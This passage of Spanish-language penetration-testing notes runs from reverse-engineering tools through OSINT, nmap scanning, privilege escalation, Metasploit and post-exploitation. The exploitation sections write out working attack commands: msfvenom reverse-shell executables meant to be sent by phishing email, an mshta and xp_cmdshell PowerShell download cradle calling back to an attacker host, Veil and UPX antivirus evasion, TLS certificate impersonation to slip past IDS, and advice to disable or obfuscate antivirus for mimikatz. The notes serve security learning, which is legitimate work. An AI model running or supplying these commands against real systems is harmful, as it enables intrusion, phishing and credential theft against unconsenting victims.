    - También se podría usar `s direccionMemoria`, siendo la dirección de memoria la entrada de alguna función. Esto nos moverá a dicha posición pudiendo hacer simplemente `pdf` sin especificar nada más
    - Si iniciamos radare con `-d` podemos poner un breakpoint en el programa con `db direcciónMemoria`
    - En una determinada función podríamos usar `VV` para ver un gráfico del flujo del programa y si pulsamos `:` podemos meter comandos como en vim, en este caso pondremos `dc` para iniciar la ejecución del programa. (Podemos usar `?` para ver la ayuda)
    - La ejecución del programa parará en nuestro breakpoint y podremos ir paso a paso con le tecla `s` viendo los pasos en el gráfico. Más información [aquí](https://monosource.gitbooks.io/radare2-explorations/content/intro/visual_graphs.html)
    - Más información para debuguear con Radare [aquí](https://monosource.gitbooks.io/radare2-explorations/content/intro/debugging.html)
    - Dejo [esto](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view) para más información
- **PEiD:** Detectan los empaquetadores de código más comunes
- **ILSpy:** Descompilador .NET
- **IDA PRO:** Otra herramienta de ingeniería inversa
- **UPX:** Empaquetador para ejecutables
- **Immunity Debugger:** Programa para hacer debugging
- **CFF Explorer:** Un conjunto de herramientas gratuito que incluye un editor de PE llamado CFF Explorer y un visor de procesos
- **Resource Hacker:** Permite extraer recursos de binarios
- **Exeinfo PE:** Verifica archivos exe
- **PE Tools:** Conjunto de herramientas para manipular archivos exe

# Metodología de hacking (Pentest)
Usaremos OSSTM (Metodologia abierta de Comprobación y Seguridad), básicamente las cosas que hay que testear en un sistema.

## Ciclo de vida de un pentest

### Reconocimiento (OSINT o inteligencia de fuentes abiertas)
- **Información pública:** Prueba a hacer `curl -I -L https://www.google.com/ -v`
- **Hunter:** Para encontrar emails en paginas web
- **Robtex:** Investigación de IPs
- **Whois:** Utilizando la página https://whois.domaintools.com/ o el comando `whois` de Linux
- Comando `host <dominio>`
- Leaks de memoria en dominios (https://pastebin.pl/). Con https://haveibeenpwned.com/ tambien podemos ver si vale la pena buscar
- En https://scylla.sh/ podemos encontrar también leaks de información pero además nos muestra las contraseñas leakeadas
- **mailfy:** Metes un email y te dice si tiene alguna cuenta de redes sociales linkeada
- **h8mail:** Metes un mail y busca información de leaks
- [**Shodan**](https://www.shodan.io/)**:** Búsqueda de dispositivos mediante ip, dominios que usen en sus servicions...
- **geoiplocation:** Saca una localización aproximada de una IP
- **ardilla.ai:** Mirar operadora de un número movil y ver si en algún momento se ha cortado
- Si se accede al archivo `robots.txt` de una pagina tenemos info de lo que no se quiere indexar
- Existen hosting dedicados y compartidos (varios dominios con una IP)
- **dnsmap:** Para subdominios
- **wafwoof:** Sondear firewall
- [**Netcraft**](https://www.netcraft.com/)**:** Histórico de los diferentes servicios IP donde se ha alojado un dominio
- **whatweb:** Saca información de una web
- **TheHarvester:** Recolecta toda la información que se puede obtener de un dominio
- **Dato curioso:** A veces nos podemos encontrar con que un determinado dominio tiene una carpeta (la raíz por ejemplo) que en vez de esta bloqueada porquen no hay nada que mostrar ahí, hace un directory listing. Con eso se puede sacar cosas guays
- **Bucket AWS:** A veces se guarda información en la nube utilizando este servicio de amazon. Para ver si podemos acceder al menos a ver lo que hay, las URL tienen el formato siguiente: `http://bucketname.region-name.s3.amazonaws.com/` (`region-name` se puede omitir)
- [**sherlock**](https://github.com/sherlock-project/sherlock)**:** Permite buscar uno o más nombres de usuario en todas las páginas que se te ocurran
- [**LittleBrother**](https://github.com/lulz3xploit/LittleBrother)**:** Parecido a sherlock pero pudiendo buscar por nombre, correo, apellidos, usuario...
- Un par de frameworks de OSINT:
	- [**iKy**](https://github.com/kennbroorg/iKy)
	- [**Maltego**](https://www.maltego.com/)
- [**Foca**](https://github.com/ElevenPaths/FOCA)**:** Enumeración de organizaciones a partir de archivos que recolecta y escanea
- Wayback machine para visitar paginas web en un estado anterior
- Usando el dork the Google: `cache:URL` es posible obtener las versiones cacheadas del sitio web en cuestión

### Escaneo y enumeración
- **wpscan:** Viene genial para atacar Wordpress
- [**threader3000**](https://github.com/dievus/threader3000)**:** Escaner de puertos multihilo
- [**rustscan**](https://github.com/RustScan/RustScan)**:** Escanea los puertos muy rápido y después ejecuta nmap
- [**nmap**](https://github.com/nmap/nmap)**:**
	- Las flags que usa por defecto son: `-PE`, `-PS`, `-PA` y `-PP`
	- **`--disable-arp-ping`:** Para cuando hay un proxy arp que dice que todos los hosts están *up*
	- El scan de puertos usa `-sS` por defecto si se ejecuta nmap como administrador
	- **`-PU`:** O modo UDP. Lento, puertos de este tipo tipicos: 53(DNS), 162/162(SNMP), 67/68(DHCP). 
	- **`--host-timeout`:** Puede ayudar a acelerar el scan de este tipo para saltar hosts lentos
	- Si no se recibe respuesta el puerto estará o filtrado o abierto. Mirar la version del servicio de un puerto con `-sV` puede ayudar
	- **`-sN`, `-sF`, `-sX`:** Pueden pasar más desapercibidos aunque muchos IDS los pillan igual. 
		- No distinguen entre abierto y filtered
		- **`--scan-flags`:** Para mas tipos de escaneos
		- Algunos sistemas nos siguen el estándar (cisco, microsoft) y marcan todo como cerrado. Para la mayoria de UNIX va bien
	- **`-sA`:** Realmente solo vale para determinar si los paquetes ACK son filtrados por el firewall
	- **`-sW`:** En ciertas implementaciones se puede identificar si un puerto esta open o no con la *flag* ACK. No siempre y pocos sistemas asi. Comportamiento inverso a veces
	- **`-sM`:** Utiliza Fin/ACK. Algunos sistemas BSD devuelven RST si estan cerrados pero no si estan abiertos.
	- **`-sZ`:** Util para saltar ciertas reglas de firewall pero no es algo invisible tampoco
	- **`-sO`:** Determina los protocolos soportados por la maquina objetivo
	- **`-sI`:** El tipo zombie es para hacer el scan desde otro host. Esto permite saltar cosas como un filtro IP y culpar a otra maquina del escaneo. También es útil para determinar relaciones de confianza entre hosts
	- Con este script se puede determinar si un host es buen zombie `nmap --script ipidseq [--script-args probepor=port] target` (Con `-O -v` también podríamos saberlo). La máquina zombie deberá estar ociosa (IDLE) y utilizar un generador de secuencia IP (IP ID Sequence Generation) de tipo `Incremental` o `Broken little-endian incremental` para poder predecir que ID colocará a los paquetes.
		- Ejemplo: `nmap -Pn -sI zombie_ip target_ip` La flag `-Pn` es importante, puesto que si no la ponemos nmap hará en primer ping al objetivo para saber si está vivo y se pierde la gracia de ser sigiloso
	- **`-b`:** Útil si todo falla. Analizar objetivo desde host ftp
	- **Scipts**
		- **Categorias:** auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, vuln
		- Hay un script que podemos usar con `--script=banner` que lo que hace es determinar versiones de servicios a partir del banner que te dan al conectar. Esto se puede hacer con telnet y netcat tambien.
	- **Timing**
		- Nmap tiene parámetros para determinar tiempos de respuesta, cada cuento mandar paquetes... pero al final se suele usar una plantilla: `-T paranoid | sneaky | polite | normal | aggressive |insane (Del 0 al 5)`
	- **Firewalls**
		- Con esta opción se pueden modificar los paquetes IP enviados para intentar saltarnos un firewall `--ip-options R (record-route) | T (record-timestamp) | U (R y T) |  L (Ruting loose) <ip> | S (Ruting strict) <lista ip>`
		- **`--spoof-mac`:** Le puedes pasar 0 para que sea random, un nombre tipo Apple | Cisco o la cadena en hexadecimal que sea (si no es completa la termina nmap)
		- **`--proxies`:** Está bastante verde según la documentacin, solo los scripts y el scan de versiones funcionan con esto. Basicamente especificas una serie de proxys por los que pasar antes de conectar al target. Prefiero usar [Proxychains](https://github.com/haad/proxychains) directamente la verdad.
		- **`--badsum`:** Se mandan paquetes corruptos que el sistema descarta al estar mal y por tanto las respuestas suelen venir de IDS o Firewalls que no miran los checksums
		- **`--adler32`:** Para utilizar el antiguo algoritmo de cálculo del checksum de un paquete SCTP. Puede venir bien para recibir paquetes de sistemas antiguos
- **nessus:** Hace un escaneo de vulnerabilidades de un host. Tiene interfaz bonita. No permite escanear de forma remota, solo local en version gratuita, aunque se podría hacer un tunel ssh para nessus. Esta guay para ver las vulnerabilidades directamente con sus puntuaciones y tal.
- [**BloodHound**](https://github.com/BloodHoundAD/BloodHound)**:** Utilizado para encontrar caminos de escalado de privilegios complejos de forma sencilla en un entorno de Active Directory
- **MBSA:** Algo obsoleto pero se puede bajar para escanear nuestro PC Windows en busca de brechas de seguridad
- [**gobuster**](https://github.com/OJ/gobuster)**:** Para sacar todos los directorios de una web
- [**Nikto**](https://github.com/sullo/nikto)**:** Escaner de vulnerabilidades web: Escaner de vulnerabilidades web
- **enum4linux:** Para pillar info de hosts Windows y Samba
- **showmount:** En el caso de tener un puerto con el servicio NFS, puede mostrar con el parámetro `-e` si hay algún directorio montado
- **smbclient:**
	- **`smbclient -N -L //IP/`:** Para listar directorios de un server samba windows.
	- **`smbclient -N //IP/dir`:** Nos conectamos y entramos al directorio que hayamos puesto
	- Con el comando `get` podemos pillar archivos
	- Con el comando `put` podemos subir archivos
- **CVSS:** Se utiliza un sistema de puntuación para dar puntos a las diferentes vulnerabilidades que se encuentren y dar un nivel de riesgo
- **Etiquetado de vulnerabilidades**
	- Para buscar las puntuaciones hay que buscar por etiqueta, hay varias:
		- CVE para buscar las vulnerabilidades
		- También está BID (Bugtrac id) de security focus para identificar vulnerabilidades
		- El propio de Windows
		- **Bases de datos:**
			- OSVD, NVD, BID, ExploitDB
- [**egresscheck-framework**](https://github.com/stufus/egresscheck-framework)**:** Herramienta para comprobar que puertos bloquea un firewall de salida

### Ganar acceso y escalar privilegios
- En Linux busca siempre la versión del SO, la del kernel y también usa `apt list --upgradeable` para comprobar paquetes no actualizados. Por ejemplo, versiones antiguas de `snap` pueden ser vulnerables a exploits como [dirty_sock](https://www.exploit-db.com/exploits/46362)
- [**PayloadAllTheThings Linux - Privilege Escalation**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)**:** Una chuleta con cosas para probar para escalar privilegios en un sistema Linux. El resto del repositorio contiene un montón de información útil sobre otros temas.
- [**Impacket**](https://github.com/SecureAuthCorp/impacket)**:** Colección de clases de Python para trabajar con protocolos de red. Conectarte a cualquier lado pero gestionando a mano el protocolo, la cosa es que incluye ejemplos tipo:
	- **mssqlclient:** Un cliente para conectarte a una base de datos SQL
	- **psexec:** Abrir shell remoto con privilegios
- [**GTFOBins**](https://gtfobins.github.io/)**:** Una lista de binarios de Unix que se pueden usar para eludir las restricciones de seguridad locales en sistemas mal configurados
- Ruta de ejemplo de donde se encuentra el archivo archive.php en Wordpress: `http://10.10.248.106/wp-content/themes/twentyfifteen/archive.php` Es un fichero que se suele usar para meter una reverse shell
- En `/dev/shm` podemos escribir seamos quien seamos, es la carpeta de memoria compartida del sistema
- **nc:** Super útil, permite conectarse a todo tipo de servicios, mandar comandos, escuchar en un determinado puerto...
- **socat:** Parecido a netcat pero con la capacidad de redireccionar puertos entre si. Útil para pivotar
- Como estabilizar un revershell:
```console
# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# En la shell reversa
$ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z

# En nuestra máquina
$ stty raw -echo
$ fg

# En la shell reversa
# Presionar Intro/CTRL-C
$ export TERM=xterm
```
- Si Python no estuviese disponible también es posible hacer:
```console
$ script -qc /bin/bash /dev/null
```
- Es interesante mirar archivos con los permisos SUID o SGID puestos (Sobretodo si son ejecutables) ya que podramos usarlos para escalar privilegios: `find / -perm /4000 2> /dev/null` para buscar archivos con el SUID y `find / -perm /2000 2> /dev/null` con el SGID. También explorar todas las `capabilities` (da privilegios de root pero en trozos digamos) de los distintos archivos del sistema viene guay: `getcap -r / 2> /dev/null`
- Probar el comando `sudo -l` a veces puede servir para detectar posibles métodos de escalado de privilegios
- Si el usuario pertenece al grupo lxd o docker puede que podamos montar todo el sistema de archivos de la victima en un contenedor y acceder al mismo como root dentro del contenedor
- Con `ltrace` se puede ejecutar un programa y que se muestren algunas de las llamadas a funciones que se realizan
- [**Responder**](https://github.com/lgandx/Responder)**:** LLMNR/NBT-NS/mDNS Poisoner y NTLMv1/2 Relay
- [**metasploit**](https://github.com/rapid7/metasploit-framework)**:**
	- Metasploit tiene un montón de exploits ademas de un entorno de desarrollo para crear nuevos. Para iniciarlo por primera vez: 
	```console
	Anthares101@kali:~$ sudo msfdb init #Inicializa base de datos
	Anthares101@kali:~$ msf console #Iniciar metasploit
	```
	- **Así cosas básicas:**
		- **`use [ruta exploit]`:** Así se selecciona que se utilizará
		- **`show options`:** Mostrará los parámetros del exploit a configurar
		- Podemos hacer `set [PARAM] [VALUE]` para configurar un determinado parámetro: `set LHOST 10.0.2.4`
		- **`set PAYLOAD cmd/unix/reverse`:** Esto lo que hace es añadir al exploit un payload, que en este caso ejecutará un shell remoto
		- **`run`:** Ejecutar un exploit o lo que sea que tengamos seleccionado con `use`
		- **`meterpreter`:** Es algo así como una shell vitaminada. Con el comando shell tendremos acceso a una shell del sistema
		- **Shellcode:** Conjunto de instrucciones dentro de un payload que suele estar en ensamblador
		- **Encoder:** Esconde los payloads
	- Para upgradear shell a meterpreter: `post/multi/manage/shell_to_meterpreter` y una vez en meterpreter podemos usar módulos de post útiles:	
		- **`run post/windows/gather/checkvm`**
		- **`run post/multi/recon/local_exploit_suggester`:** Para ver que podemos usar para subir privilegios
		- **`run post/windows/manage/enable_rdp`:** Para abrir el control de escritorio remoto
		- **`run autoroute -h`:** Permite usar como gateway la máquina victima para acceder a otras partes de la red
	- Para obtener una reverse shell directamente con una petición del navegador:
	  ```
	  # En Metasploit
	  use exploit/windows/misc/hta_server
	  set LHOST 443 # Opciona, puede ayudar en ocasiones
	  exploit

	  # En la victima
	  mshta.exe http://<IP_ATACANTE>:8080/<NOMBRE_GENERADO>.hpa
	  ```
	- Veamos como crear una reverve shell con un payload staged (Necesitará un handler especifico pero será más pequeño) utilizando phishing a un sistema Windows:
		1. Usamos `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATACKER_IP> LPORT=53 -f exe -o NotAShell.exe` para crear el ejecutable que mandaremos
		2. Deberemos ahora lanzar Metasploit y esperar a que alguien ejecute el archivo creado antes:
		```
		msfconsole
		use exploit/multi/handler
		set payload windows/meterpreter/reverse_tcp
		set LPORT 53
		set LHOST <La misma dirección usada con msfvenom>
		exploit -j
		```
		3. Ahora toca la parte en la que mandas el correo intentando convencer al usuario de ejecutar tu archivo
	- En caso de querer utilizar alguna herramienta externa a metasploit podemos hacer lo siguiente:
		1. Abrir un proxy socks4a desde metasploit para utilizar la route que hemos metido antes
		2. Una vez con eso hecho, vamos al fichero `/etc/proxychains.conf` y añadimos una linea de que proxy usar (Ejemplo: `socks4 127.0.0.1 8080`)
		3. Con el comando `proxychains` delante de cualquier comando podremos mandar dicho comando a traves de nuestro proxy
	- Se podría crear un script para metasploit y agilizar procesos que se usen mucho `msfconsole -r resourcescript.rc`
	- Para evitar posibles IDs/IPs se puede hacer lo siguiente para evitar que Metasploit utilice su certificado TLS con el módulo `exploit/multi/handler` al usar payloads HTTPS:
		1.  Usando `auxiliary/gather/impersonate_ssl` se copia un certificado TLS de un determinado sitio web
		2. Ahora para generar el payload de Meterpreter los haremos desde la propia consola de Metasploit (La ruta al certificado TLS te la da el propio `auxiliary/gather/impersonate_ssl` al terminar):
		   ```
		   msf payload(reverse_http) > use payload/windows/meterpreter/reverse_https
		   msf payload(reverse_https) > set stagerverifysslcert true
		   stagerverifysslcert => true
	       msf payload(reverse_https) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
		   msf payload(reverse_https) > set LHOST 10.0.2.15
		   LHOST => 10.0.2.15
		   msf payload(reverse_https) > set LPORT 8080
		   LPORT => 8080
		   msf payload(reverse_https) > generate -f exe -o /tmp/payload.exe
		   [*] Writing 73802 bytes to /tmp/payload.exe...
		   ```
		3. Por último toca preparar el módulo `exploit/multi/handler`:
		   ```
		   msf payload(reverse_https) > use exploit/multi/handler 
           msf exploit(handler) > set LHOST 10.0.2.15
		   LHOST => 10.0.2.15
		   msf exploit(handler) > set LPORT 8080
		   LPORT => 8080
		   msf exploit(handler) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
		   msf exploit(handler) > set stagerverifysslcert true
		   stagerverifysslcert => true
		   msf exploit(handler) > exploit -j

		   [*] Exploit running as background job.
		   ```
	- [**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit)**:** Conjunto de módulos Powershell (Incluye PowerUp y PowerView) que puedes importar con el módulo de Powershell para realizar diversas acciones en máquinas Windows
	- [**Nishang**](https://github.com/samratashok/nishang)**:** Nishang es un framework y colección de scripts y payloads
	- [**Posh-SecMod**](https://github.com/darkoperator/Posh-SecMod)**:** Otro conjunto de módulos Powershell que pueden ser interesantes (Powershell v3 solo)
	- [**Psgetsystem**](https://github.com/decoder-it/psgetsystem)**:** Script de Powershell para conseguir SYSTEM usando un proceso como padre
	- Si el comando `getsystem` de Meterpreter no consigue escalar puede que se necesite hace un bypass a UAC. En Metasploit hay algunos módulos que podrían ayudar con esto, usa el módulo `post/multi/recon/local_exploit_suggester` para comprobar si alguno vale. En caso de no poder realizar el bypass con Metasploit, siempre queda [UACME](https://github.com/hfiref0x/UACME)
	- En el caso de tener que evitar un AV se puede utilizar [Veil](https://github.com/Veil-Framework/Veil) junto al empaquetador [UPX](https://upx.github.io/). Lo primero es abrir Veil y generar un ejecutable de Meterpreter:
      ```bash
      ...
      Veil>: use 1
      ...
	  Veil/Evasion>: use python/meterpreter/rev_tcp.py
	  [python/meterpreter/rev_tcp>>]: set LHOST 172.16.5.101
	  [python/meterpreter/rev_tcp>>]: generate
	  ===============================================================================
	                                     Veil-Evasion
	  ===============================================================================
	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
	  ===============================================================================
  
  	   [>] Please enter the base name for output files (default is payload): hello
  	  ===============================================================================
	                                     Veil-Evasion
	  ===============================================================================
	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
	  ===============================================================================

	   [?] How would you like to create your payload executable?

	       1 - PyInstaller (default)
	       2 - Py2Exe

	   [>] Please enter the number of your choice: 1
	  ...
	  ===============================================================================
	                                   Veil-Evasion
	  ===============================================================================
	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
	  ===============================================================================

	   [*] Language: python
	   [*] Payload Module: python/meterpreter/rev_tcp
	   [*] Executable written to: /var/lib/veil/output/compiled/hello.exe
	   [*] Source code written to: /var/lib/veil/output/source/hello.py
	   [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/hello.rc

	  Hit enter to continue...
      ```
      Por último, utilizando UPX se comprime el ejecutable:
      ```bash
      ┌──(rootkali)-[~]
	  └─# mv /var/lib/veil/output/compiled/hello.exe hello_world.exe

	  ┌──(rootkali)-[~]
	  └─# upx --best --ultra-brute -o hello_sneak.exe hello_world.exe
      ```
      El payload que se debe usar en el handler de Metasploit en este caso sería `windows/meterpreter/reverse_tcp`
- [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
- [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
- [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)**:** SessionGopher es una herramienta de PowerShell que busca y descodifica sesiones guardadas para herramientas de acceso remoto
- [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
- Para mirar que permisos tenemos en Windows podemos ejecutar: `whoami /priv`. Si tenemos `SeImpersonatePrivilege` o `SeImpersonatePrivilege` posiblemente podamos escalar privilegios fácilmente
- [**Seatbelt**](https://github.com/GhostPack/Seatbelt)**:** Parecido al anterior pero solo con Windows. [Aquí](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) se pueden descargar los .exe ya compilados
	- Si Seatbelt pilla que una cuenta tiene las credenciales guardadas en el Gestor de Credenciales de Windows podemos ejecutar comandos como dicha cuenta de la siguiente manera: `runas /savecred /user:<usario> /profile "cmd.exe"`
- [**John the Ripper**](https://github.com/openwall/john)**:** Permite crackear un montón de tipos de contraseñas.
- [**Invoke-CradleCrafter**](https://github.com/danielbohannon/Invoke-CradleCrafter)**:** Permite generar payloads ofuscados para ejecutar desde Powershell
- [**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation)**:** Permite ofuscar payloads the Powershell
- **ReverShell desde server SQL:**
	- Con este comando: `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` se puede ejecutar
la shell reversa que tenemos en el equipo desde server SQL vulnerable. 
	- Recordad hacer en local: 
		- **`python3 -m http.server 80`:** En el directorio donde se tenga el archivo de `reverseShell`
		- **`nc -lvnp 443`:** Para escuchar la conexión de la maquina objetivo que nos proporcionará un shell remoto
		- **`ufw allow from 10.10.10.27 proto tcp to any port 80,443`:** Para abrir los puertos pertinentes en caso de tener `Uncomplicated Firewall`
### Mantener acceso, Cubrir rastro y Reportar
- **Túneles SSH:** Utilizando un reenvio dinámico de puertos con SSH podemos usar la máquina remota como proxy SOCKS y configurarlo en `proxychains` para pivotar: `ssh -q -N -D 127.0.0.1:8000 -i privateKey.pem user@remoteHost`
- **mimikatz:** De lo más utilizado para hacer un dump y crackear contraseñas en sistemas Windows. Se deberá desactivar el antivirus en la máquina objetivo o utilizar una versión ofuscada puesto que al ser tan utilizado es detectado fácilmente
- **Servidor de comando y control:**
	- [**Powershell Empire**](https://github.com/BC-SECURITY/Empire/)**:** Framework de post explotación. Tiene varias herramientas útiles y permite el control sencillo de máquinas exploiteadas
	- [**Starkiller**](https://github.com/BC-SECURITY/Starkiller)**:** Frontend para Powershell Empire
- [**CrackMapExec**](https://github.com/byt3bl33d3r/CrackMapExec)**:** Herramienta de Post-Explotación que, entre otras cosas, permite comprobar a que máquinas tenemos acceso especificando usuario y contraseña (En plano o el hash) en redes Active Directory
- [**Evil-WinRM**](https://github.com/Hackplayers/evil-winrm)**:** Permite la conexión a una máquina Windows usando el Gestor Remoto de Windows. Se puede usar el hash NT en vez de una contraseña en texto plano para iniciar sesión
